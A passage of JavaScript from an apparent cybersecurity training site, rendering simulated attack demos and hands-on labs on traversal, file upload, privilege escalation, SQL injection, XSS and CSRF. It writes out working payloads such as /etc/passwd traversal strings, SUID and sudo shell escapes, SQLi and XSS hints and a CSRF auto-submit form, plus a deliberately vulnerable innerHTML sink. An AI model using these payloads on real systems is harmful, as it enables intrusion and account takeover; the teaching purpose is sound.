        $$('#sessBtns .demo-btn').forEach(function(b){if(b.dataset.s)b.onclick=function(){$$('#sessBtns .demo-btn').forEach(function(x){if(x.dataset.s)x.classList.remove('active');});b.classList.add('active');mode=b.dataset.s;attempt=1005;renderSessions();$('#sessResult').innerHTML='';};});
        $('#sessAttack').onclick=function(){
            if(mode==='seq'){$('#sessResult').innerHTML='<div style="color:var(--success)">Trying: '+attempt+' - ACCESS GRANTED!</div>';attempt++;}
            else{var rand=Math.random().toString(36).substring(2,14);$('#sessResult').innerHTML='<div style="color:var(--danger)">Trying: '+rand+' - FAILED. Too many combinations!</div>';}
        };
    }

    function demoClickjack(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Clickjacking Attack</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="position:relative;height:200px;border:2px solid var(--border);border-radius:8px;overflow:hidden"><div style="position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg-secondary);z-index:0"><div style="font-size:1.5rem">Prize!</div><div style="font-weight:bold;margin:8px 0">You won a free iPhone!</div><button id="cjPrize" class="demo-btn" style="font-size:1.1rem;padding:12px 24px">Click to claim!</button></div><div id="cjOverlay" style="position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;opacity:0;z-index:1;background:white;pointer-events:none"><div style="color:#333;font-weight:bold">BigBank.com</div><div style="margin:8px 0;color:#333;font-size:0.85rem">Transfer $10,000 to account 1337?</div><button style="background:#e74c3c;color:white;border:none;padding:12px 24px;border-radius:8px;font-size:1.1rem">Confirm Transfer</button></div></div><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm" id="cjShow">Show Hidden Layer</button><button class="demo-btn demo-btn-sm" id="cjHide">Hide</button></div><div id="cjMsg" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Click the "prize" button to see what happens...</div></div></div>';
        $('#cjPrize').onclick=function(){$('#cjMsg').innerHTML='<span style="color:var(--danger)">You just confirmed a $10,000 bank transfer! The prize button was overlaid on a hidden bank page.</span>';};
        $('#cjShow').onclick=function(){$('#cjOverlay').style.opacity='0.5';$('#cjOverlay').style.pointerEvents='auto';};
        $('#cjHide').onclick=function(){$('#cjOverlay').style.opacity='0';$('#cjOverlay').style.pointerEvents='none';};
    }

    function demoDirTraversal(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">Directory Traversal Encodings</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dtBtns"><button class="demo-btn demo-btn-sm active" data-e="plain">Plain ../</button><button class="demo-btn demo-btn-sm" data-e="url">URL Encoded</button><button class="demo-btn demo-btn-sm" data-e="double">Double Encoded</button></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Request Path:</div><div id="dtPath" style="font-family:var(--font-mono);font-size:0.9rem;word-break:break-all;margin:8px 0"></div><div id="dtResult" style="font-size:0.85rem;margin-top:8px"></div></div></div></div>';
        var enc={plain:{path:'../../../../etc/passwd',desc:'Standard traversal - easily caught by basic filters'},url:{path:'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',desc:'URL encoding bypasses simple string filters'},double:{path:'%252e%252e%252f%252e%252e%252fetc%252fpasswd',desc:'Double encoding - decoded twice: %252e -> %2e -> .'}};
        $$('#dtBtns .demo-btn').forEach(function(b){if(b.dataset.e)b.onclick=function(){$$('#dtBtns .demo-btn').forEach(function(x){if(x.dataset.e)x.classList.remove('active');});b.classList.add('active');var e=enc[b.dataset.e];$('#dtPath').textContent=e.path;$('#dtResult').innerHTML='<span style="color:var(--danger)">'+e.desc+'</span>';};});
        $('#dtPath').textContent=enc.plain.path;$('#dtResult').innerHTML='<span style="color:var(--danger)">'+enc.plain.desc+'</span>';
    }

    function demoFileUpload(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">File Upload Bypass</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="upBtns"><button class="demo-btn demo-btn-sm" data-u="safe">photo.jpg</button><button class="demo-btn demo-btn-sm" data-u="double">shell.php.jpg</button><button class="demo-btn demo-btn-sm" data-u="mime">shell.php (MIME spoofed)</button><button class="demo-btn demo-btn-sm" data-u="null">shell.php%00.jpg</button></div><div id="uploadResult" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;text-align:center;min-height:60px"></div></div></div>';
        var results={safe:'Upload accepted: photo.jpg stored safely as image',double:'shell.php.jpg uploaded! Apache may execute this as PHP if misconfigured.',mime:'MIME type set to image/jpeg but file is PHP! Web shell uploaded!',null:'Null byte injection: shell.php\\x00.jpg - saved as shell.php!'};
        $$('#upBtns .demo-btn').forEach(function(b){if(b.dataset.u)b.onclick=function(){$('#uploadResult').innerHTML=results[b.dataset.u];};});
    }

    function demoBOF(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Buffer Overflow Visualizer</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><span style="font-size:0.85rem">Input size:</span><input id="bofSize" type="range" min="10" max="120" value="10" style="flex:1;max-width:200px"><span id="bofSizeVal" style="font-family:var(--font-mono)">10</span></div><div id="bofMem" style="display:flex;gap:2px;flex-wrap:wrap;justify-content:center"></div><div id="bofStatus" style="text-align:center;font-size:0.85rem;padding:8px;border-radius:8px"></div></div></div>';
        function render(){
            var size=+$('#bofSize').value;$('#bofSizeVal').textContent=size;
            var mem=$('#bofMem');mem.innerHTML='';
            for(var i=0;i<100;i++){
                var filled=i<size;
                var color='#edf2f7';
                if(filled&&i<80) color='#3498db';
                else if(filled&&i>=80&&i<84) color='#e67e22';
                else if(filled&&i>=84&&i<88) color='#e74c3c';
                else if(filled&&i>=88) color='#c0392b';
                else if(!filled&&i>=80&&i<84) color='#ffeaa7';
                else if(!filled&&i>=84&&i<88) color='#fab1a0';
                mem.innerHTML+='<div style="width:8px;height:20px;background:'+color+';border-radius:2px"></div>';
            }
            var status=$('#bofStatus');
            if(size<=80) status.innerHTML='<span style="color:var(--success)">Safe - input fits within buffer</span>';
            else if(size<=84) status.innerHTML='<span style="color:var(--warning)">Overwriting saved EBP!</span>';
            else if(size<=88) status.innerHTML='<span style="color:var(--danger)">OVERWRITING RETURN ADDRESS (EIP)! Attacker controls execution!</span>';
            else status.innerHTML='<span style="color:var(--danger)">NOP sled + shellcode injected!</span>';
        }
        $('#bofSize').oninput=render;render();
    }

    function demoIntOverflow(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABILITY</span><span class="demo-title">Integer Overflow</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="intBtns"><button class="demo-btn active" data-t="unsigned">Unsigned 8-bit</button><button class="demo-btn" data-t="signed">Signed 8-bit</button></div><div style="display:flex;gap:8px;align-items:center;justify-content:center"><button class="demo-btn demo-btn-sm" id="intDec">-1</button><span id="intVal" style="font-family:var(--font-mono);font-size:2rem;font-weight:bold;min-width:60px;text-align:center">127</span><button class="demo-btn demo-btn-sm" id="intInc">+1</button></div><div id="intBin" style="font-family:var(--font-mono);text-align:center;font-size:1.2rem"></div><div id="intMsg" style="text-align:center;font-size:0.85rem;color:var(--text-muted)"></div></div></div>';
        var val=127,signed=false;
        function render(){
            var display=signed?(val>127?val-256:val):val;
            $('#intVal').textContent=display;
            var bin=(val&0xFF).toString(2).padStart(8,'0');
            $('#intBin').textContent=bin;
            if(val===0&&!signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Unsigned underflow! 0-1 wrapped to 255</span>';
            else if(val===255&&!signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Unsigned overflow! 255+1 will wrap to 0</span>';
            else if(val===128&&signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Signed overflow! 127+1 = -128</span>';
            else $('#intMsg').textContent='';
        }
        $$('#intBtns .demo-btn').forEach(function(b){if(b.dataset.t)b.onclick=function(){$$('#intBtns .demo-btn').forEach(function(x){if(x.dataset.t)x.classList.remove('active');});b.classList.add('active');signed=b.dataset.t==='signed';render();};});
        $('#intInc').onclick=function(){val=(val+1)&0xFF;render();};
        $('#intDec').onclick=function(){val=(val-1)&0xFF;render();};
        render();
    }

    function demoMetasploit(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXPLOIT</span><span class="demo-title">Metasploit Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:0"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px 8px 0 0;min-height:200px;max-height:300px;overflow-y:auto" id="msfOut"></div><div style="display:flex;background:#1a1a2e;padding:4px 16px;border-radius:0 0 8px 8px"><span style="color:#ff0000;font-family:var(--font-mono);font-size:0.78rem">msf6 > </span><input id="msfIn" style="flex:1;background:transparent;border:none;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;outline:none"></div></div></div>';
        var cmds={help:'Core Commands\n  search  Search for exploits\n  use     Select a module\n  set     Set option\n  options Show options\n  exploit Launch exploit',search:'Matching Modules\n  exploit/windows/smb/ms08_067  great  MS08-067\n  exploit/windows/smb/ms17_010  great  EternalBlue','use':'[*] Module selected',options:'  RHOSTS    (required)  Target address\n  RPORT    445          SMB port\n  LHOST    (required)  Listen address',exploit:'[*] Started reverse TCP handler on 192.168.1.50:4444\n[*] Sending stage to target...\n[*] Meterpreter session 1 opened\n\nmeterpreter > '};
        var out=$('#msfOut');
        out.innerHTML='<div style="color:#ff0000">  METASPLOIT v6.3.0\n  2200 exploits - 1100 payloads\n</div>';
        $('#msfIn').onkeydown=function(e){
            if(e.key!=='Enter')return;var cmd=$('#msfIn').value.trim();$('#msfIn').value='';if(!cmd)return;
            out.innerHTML+='<div style="color:#ccc">msf6 > '+esc(cmd)+'</div>';
            var match=Object.keys(cmds).find(function(k){return cmd.indexOf(k)>=0;});
            out.innerHTML+='<div>'+(match?cmds[match]:'Unknown command: '+esc(cmd)+'. Try: help')+'</div>';
            out.scrollTop=out.scrollHeight;
        };
    }

    function demoPhishing(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Spot the Phishing Email</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:white;color:#333;padding:16px;border-radius:8px;border:1px solid #ddd"><div style="display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding-bottom:8px;margin-bottom:8px;font-size:0.85rem"><div><strong>From:</strong> security@amaz0n-support.com</div><div style="color:#999">Today 9:41 AM</div></div><div style="font-weight:bold;margin-bottom:8px;font-size:0.95rem">Urgent: Your account has been compromised!</div><div style="font-size:0.85rem;line-height:1.6"><p>Dear Valued Customer,</p><p>We detected suspicious activity. Click below to verify or your account will be suspended in 24 hours.</p><p><a href="#" style="color:#0066cc" id="phishLink">https://amazon.com/verify-account</a></p></div></div><button class="demo-btn" id="phishReveal">Reveal Red Flags</button><div id="phishFlags" style="display:none;font-size:0.85rem;line-height:1.8"></div></div></div>';
        $('#phishLink').onclick=function(e){e.preventDefault();alert('This link goes to: http://amaz0n-phish.evil.com/steal-creds');};
        $('#phishReveal').onclick=function(){$('#phishFlags').style.display='block';$('#phishFlags').innerHTML='<div style="color:var(--danger)">Red Flags:</div><ul><li>Sender: amaz0n (zero not O)</li><li>Creates urgency: 24 hours</li><li>Generic greeting</li><li>Link text differs from actual URL</li><li>Asks to click link instead of logging in directly</li></ul>';};
    }

    function demoPrivEsc(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Privilege Escalation Path</span></div><div class="demo-visual" style="flex-direction:column;gap:8px"><div style="display:flex;gap:4px;flex-direction:column;align-items:center"><div style="background:var(--accent);color:white;padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">1. Initial Access: www-data</div><div style="font-size:1.2rem">v</div><div style="background:var(--bg-secondary);padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">2. Find SUID: find / -perm -4000</div><div style="font-size:1.2rem">v</div><div style="background:var(--bg-secondary);padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">3. Exploit: /usr/bin/find -exec /bin/sh \\;</div><div style="font-size:1.2rem">v</div><div style="background:var(--danger);color:white;padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">4. Root Shell: uid=0(root)</div></div></div></div>';
    }

    function demoSUID(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">SUID Exploitation</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;white-space:pre-line" id="suidOut">www-data@target:~$ Click a button to run a command</div><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="suidBtns"><button class="demo-btn demo-btn-sm" data-c="find">find SUID files</button><button class="demo-btn demo-btn-sm" data-c="exploit">Exploit find</button><button class="demo-btn demo-btn-sm" data-c="sudo">Check sudo -l</button><button class="demo-btn demo-btn-sm" data-c="sudoexploit">Exploit sudo</button></div></div></div>';
        var cmds={find:'$ find / -perm -4000 -type f 2>/dev/null\n\n-rwsr-xr-x 1 root root  /usr/bin/find\n-rwsr-xr-x 1 root root  /usr/bin/passwd\n-rwsr-xr-x 1 root root  /usr/bin/su\n\n/usr/bin/find has SUID bit set!',exploit:'$ /usr/bin/find /etc -exec /bin/sh -p \\;\n\n# whoami\nroot\n# id\nuid=33(www-data) euid=0(root)\n\nROOT ACCESS via SUID find!',sudo:'$ sudo -l\n\nUser www-data may run:\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/less\n\nvim and less can spawn shells!',sudoexploit:'$ sudo vim -c ":!bash"\n\nroot@target:~# whoami\nroot\n\nROOT ACCESS via sudo vim!'};
        $$('#suidBtns .demo-btn').forEach(function(b){if(b.dataset.c)b.onclick=function(){$('#suidOut').textContent=cmds[b.dataset.c];};});
    }

    function demoWinPrivEsc(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">Windows Privilege Escalation</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="winBtns"><button class="demo-btn demo-btn-sm active" data-w="unquoted">Unquoted Paths</button><button class="demo-btn demo-btn-sm" data-w="stored">Stored Creds</button><button class="demo-btn demo-btn-sm" data-w="registry">Registry</button></div><div id="winOut" style="background:#0c0c0c;color:#c0c0c0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var data={unquoted:'C:\\> wmic service get name,pathname |findstr /i "Auto"\n\nVulnSvc  C:\\Program Files\\Vuln Service\\service.exe\n\nWindows tries:\n  1. C:\\Program.exe\n  2. C:\\Program Files\\Vuln.exe\n  3. C:\\Program Files\\Vuln Service\\service.exe\n\nPlace malicious Vuln.exe in C:\\Program Files\\',stored:'C:\\> type C:\\unattend.xml\n\n<AutoLogon>\n  <Password>\n    <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzAA==</Value>\n  </Password>\n  <Username>Administrator</Username>\n</AutoLogon>\n\n$ echo "UABhA..." | base64 -d\nPassword123\n\nAdministrator password recovered!',registry:'C:\\> reg query HKLM\\...\\Services\\VulnSvc /display\n\n  Everyone  Full Control\n\nAny user can modify the service!\n\nC:\\> reg add ... /v ImagePath /d C:\\evil.exe\n-> SYSTEM shell!'};
        $$('#winBtns .demo-btn').forEach(function(b){if(b.dataset.w)b.onclick=function(){$$('#winBtns .demo-btn').forEach(function(x){if(x.dataset.w)x.classList.remove('active');});b.classList.add('active');$('#winOut').textContent=data[b.dataset.w];};});
        $('#winOut').textContent=data.unquoted;
    }


    /* ============================================================
       LAB EXERCISES
       ============================================================ */
    function renderLab(lesson) {
        const pane = $('#pane-lab');
        const slug = lesson.slug || '';
        const labKey = (lesson.labHtml || slug).replace('-lab', '');
        const generators = {
            'sql-injection': labSQLi,
            'sqli-lab': labSQLi,
            'sqli': labSQLi,
            'cross-site-scripting': labXSS,
            'xss-lab': labXSS,
            'xss': labXSS,
            'csrf-attack': labCSRF,
            'csrf-lab': labCSRF,
            'csrf': labCSRF,
            'broken-authentication': labBrokenAuth,
            'brokenauth-lab': labBrokenAuth,
            'brokenauth': labBrokenAuth,
            'auth-lab': labBrokenAuth,
            'auth': labBrokenAuth,
            'idor': labIDOR,
            'idor-lab': labIDOR,
            'command-injection': labCmdI,
            'cmdi-lab': labCmdI,
            'cmdi': labCmdI,
            'path-traversal': labPath,
            'path-lab': labPath,
            'path': labPath,
            'security-misconfiguration': labMisconfig,
            'misconfig-lab': labMisconfig,
            'misconfig': labMisconfig,
            'sql-injection-101': labSQLi,
            'xss-101': labXSS,
            'csrf-101': labCSRF,
            'broken-auth-101': labBrokenAuth,
            'idor-101': labIDOR,
            'command-injection-101': labCmdI,
            'path-traversal-101': labPath,
            'security-misconfig-101': labMisconfig,
            'file-inclusion': labFileInclusion,
            'file-inclusion-101': labFileInclusion,
            'lfi': labFileInclusion,
            'fi-lab': labFileInclusion,

            // C1 Labs
            'motherboard-lab': labBoard,
            'motherboards': labBoard,
            'cpu-lab': labCPU,
            'cpus-processing': labCPU,
            'ram-lab': labRAM,
            'ram-storage': labRAM,
            'binary-lab': labBinary,
            'bits-bytes-bases': labBinary,
            'ascii-lab': labASCII,
            'ascii-encoding': labASCII,
            'base64-lab': labBase64,
            'base64-encoding': labBase64,
            'fileheader-lab': labFileHeaders,
            'file-headers': labFileHeaders,
            'logic-lab': labLogicGates,
            'boolean-logic': labLogicGates,
            'xor-lab': labXOR,
            'xor-encryption': labXOR,
            'fs-lab': labFS,
            'file-systems-overview': labFS,
            'cloud-lab': labCloud,
            'cloud-models': labCloud,
            // C2 Labs
            'os-lab': labOS,
            'os-fundamentals': labOS,
            'vm-lab': labVM,
            'vms-hypervisors': labVM,
            // C3 Labs
            'terminal-lab': labTerminal,
            'linux-terminal': labTerminal,
            'sudo-lab': labSudo,
            'superuser-sudo': labSudo,
            'folders-lab': labFolders,
            'linux-folders': labFolders,
            'permissions-lab': labPermissions,
            'file-permissions': labPermissions,
            'env-lab': labEnv,
            'env-variables': labEnv,
            'fileops-lab': labFileOps2,
            'file-operations': labFileOps2,
            'search-lab': labSearch2,
            'search-commands': labSearch2,
            'process-lab': labProcess2,
            'processes': labProcess2,
            'pipes-lab': labPipes2,
            'pipes-redirects': labPipes2,
            'ssh-lab': labSSH2,
            'ssh-building': labSSH2,
            // C4 Labs
            'dorks-lab': labDorks,
            'google-dorks': labDorks,
            'http-lab': labHTTP2,
            'http-protocol': labHTTP2,
            'cookies-lab': labCookies2,
            'cookies-storage': labCookies2,
            // C5 Labs
            'hardware-lab': labHardware2,
            'network-hardware': labHardware2,
            'ip-lab': labIP2,
            'ip-addresses': labIP2,
            'tcpudp-lab': labTCPUDP2,
            'tcp-vs-udp': labTCPUDP2,
            'subnet-lab': labSubnet2,
            'subnetting': labSubnet2,
            'spf-lab': labSPF2,
            'email-spoofing-spf': labSPF2,
            'dns-lab': labDNS2,
            'dns-records': labDNS2,
            'osi-lab': labOSI2,
            'osi-model': labOSI2,
            'dos-lab': labDoS2,
            'dos-attacks': labDoS2,
            // C6 new labs
            'session-lab': labSession,
            'session-guessing': labSession,
            'clickjack-lab': labClickjack,
            'clickjacking': labClickjack,
            'dirtraversal-lab': labDirTraversal,
            'directory-traversal': labDirTraversal,
            'upload-lab': labUpload,
            'file-upload': labUpload,
            'bof-lab': labBOF2,
            'buffer-overflow-intro': labBOF2,
            'intoverflow-lab': labIntOverflow,
            'integer-overflow': labIntOverflow,
            'msf-lab': labMSF,
            'metasploit': labMSF,
            'phishing-lab': labPhishing2,
            'phishing': labPhishing2,
            'privesc-lab': labPrivEsc2,
            'privesc-intro': labPrivEsc2,
            'suid-lab': labSUID2,
            'privesc-suid-sudo': labSUID2,
            'winprivesc-lab': labWinPrivEsc2,
            'privesc-windows': labWinPrivEsc2,
        };

        const gen = generators[slug] || generators[labKey];
        if (gen) gen(pane, lesson);
        else pane.innerHTML = '<div class="empty-state"><div class="icon">🔬</div><p>Lab exercise coming soon.</p></div>';
    }

    function labSQLi(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Bypass the Login Form</h4>
                        <p>The login form below is vulnerable to SQL injection. Your goal is to log in as the <strong>admin</strong> user without knowing the password.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">📋</span> The backend query is: <code>SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code></div>
                        <div class="rule"><span class="rule-icon">🏁</span> Success condition: The query returns at least one row (authentication bypassed)</div>
                    </div>
                </div>

                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> SQL Injection Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Username</label><input class="lab-input" id="labSqliUser" placeholder="Enter username…"></div>
                            <div class="lab-field"><label>Password</label><input class="lab-input" id="labSqliPass" placeholder="Enter password…"></div>
                            <div class="lab-query-preview">
                                <span class="preview-label">Generated SQL Query</span>
                                <div id="labSqliPreview">SELECT * FROM users WHERE username='' AND password=''</div>
                            </div>
                            <button class="btn btn-primary" id="labSqliSubmit">Submit Login</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labSqliResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2</button>
                    <button class="btn-hint" data-hint="3">💡 Hint 3</button>
                    <div class="hint-box hidden" id="labSqliHint"></div>
                </div>
            </div>`;

        const userI = $('#labSqliUser'), passI = $('#labSqliPass');
        const preview = $('#labSqliPreview'), result = $('#labSqliResult');

        function updatePreview() {
            preview.textContent = `SELECT * FROM users WHERE username='${userI.value}' AND password='${passI.value}'`;
        }
        userI.oninput = updatePreview;
        passI.oninput = updatePreview;

        const hints = {
            '1': 'Think about what characters have special meaning in SQL. The single quote (<code>\'</code>) is used to delimit strings.',
            '2': 'Try making the WHERE clause always true. The expression <code>1=1</code> is always true.',
            '3': 'Use <code>\' OR \'1\'=\'1\' --</code> as the username. The <code>--</code> comments out the password check.',
        };

        $$('.btn-hint').forEach((b) => {
            b.onclick = () => { const h = $('#labSqliHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); };
        });

        $('#labSqliSubmit').onclick = () => {
            const u = userI.value, p = passI.value;
            const sql = `SELECT * FROM users WHERE username='${u}' AND password='${p}'`;
            const bypassed = sql.includes("OR") && (sql.includes("1'='1") || sql.includes("1=1")) || sql.includes("--") && sql.includes("'");

            result.classList.remove('hidden');
            if (bypassed) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You bypassed the authentication! The query returned the admin user row because the WHERE clause was made always true.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> The login was not bypassed. Try manipulating the SQL query structure using special characters.';
            }
        };
    }

    function labXSS(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Execute JavaScript via XSS</h4>
                        <p>The comment box below renders user input without sanitization. Inject a payload that triggers a JavaScript alert.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">🏁</span> Success: The output contains an executable script tag or event handler</div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> XSS Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Comment Input</label><textarea class="lab-input" id="labXssInput" rows="3" placeholder="Enter your comment…"></textarea></div>
                            <div class="lab-preview-section">
                                <span class="preview-label">Rendered Output (innerHTML)</span>
                                <div class="lab-preview-box" id="labXssPreview"></div>
                            </div>
                            <button class="btn btn-primary" style="margin-top:12px" id="labXssSubmit">Post Comment</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labXssResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2</button>
                    <div class="hint-box hidden" id="labXssHint"></div>
                </div>
            </div>`;

        const hints = { '1': 'Try using HTML tags that can execute JavaScript, like <code>&lt;script&gt;</code> or <code>&lt;img onerror&gt;</code>.', '2': 'Try: <code>&lt;img src=x onerror="alert(1)"&gt;</code>' };
        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labXssHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); }; });

        $('#labXssSubmit').onclick = () => {
            const val = $('#labXssInput').value;
            $('#labXssPreview').innerHTML = val; // Intentionally vulnerable for demo
            const result = $('#labXssResult');
            const hasXss = /<script/i.test(val) || /on\w+\s*=/i.test(val) || /javascript:/i.test(val);
            result.classList.remove('hidden');
            if (hasXss) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> Your XSS payload was injected and would execute JavaScript in a real browser context.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> Your input didn\'t contain executable JavaScript. Try using HTML tags with event handlers.';
            }
        };
    }

    function labCSRF(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Craft a CSRF Attack</h4>
                        <p>Write an HTML form that would automatically transfer money from a victim's bank account. The bank's transfer endpoint is <code>POST /transfer</code> with parameters <code>to</code> and <code>amount</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> CSRF Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Write your malicious HTML</label>
                            <textarea class="lab-input" id="labCsrfInput" rows="8" placeholder='<form action="https://bank.com/transfer" method="POST">&#10;  ...&#10;</form>'></textarea></div>
                            <button class="btn btn-primary" id="labCsrfSubmit">Verify Payload</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labCsrfResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labCsrfHint"></div>
                </div>
            </div>`;

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labCsrfHint'); h.innerHTML = 'Create a form with <code>action</code> pointing to the bank transfer URL, hidden inputs for <code>to</code> and <code>amount</code>, and auto-submit with <code>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>.'; h.classList.remove('hidden'); }; });

        $('#labCsrfSubmit').onclick = () => {
            const val = $('#labCsrfInput').value.toLowerCase();
            const result = $('#labCsrfResult');
            const hasForm = val.includes('<form') && val.includes('method');
            const hasAction = val.includes('action') && (val.includes('transfer') || val.includes('bank'));
            const hasHidden = val.includes('hidden') || (val.includes('name=') && val.includes('value='));
            result.classList.remove('hidden');
            if (hasForm && hasAction && hasHidden) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> Your CSRF payload correctly targets the bank\'s transfer endpoint with hidden parameters. When a logged-in user loads this page, their browser would automatically send the request with their session cookie.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                let msg = '❌ <strong>Not quite.</strong> Your payload is missing: ';
                const missing = [];
                if (!hasForm) missing.push('a <form> element with method attribute');
                if (!hasAction) missing.push('action pointing to the transfer endpoint');
                if (!hasHidden) missing.push('hidden input fields for parameters');
                result.innerHTML = msg + missing.join(', ') + '.';
            }
        };
    }

    function labBrokenAuth(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Identify Authentication Weaknesses</h4>
                        <p>Review the code below and list all the security issues you can find.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Code Review Lab</div>
                        <div class="terminal-body">
                            <pre class="code-example" style="background:#1a202c;color:#e2e8f0;padding:16px;border-radius:8px;font-size:0.82rem;line-height:1.7">public boolean login(String user, String pass) {
    // No rate limiting
    String query = "SELECT * FROM users WHERE username='" 
        + user + "' AND password='" + pass + "'";
    ResultSet rs = stmt.executeQuery(query);
    if (rs.next()) {
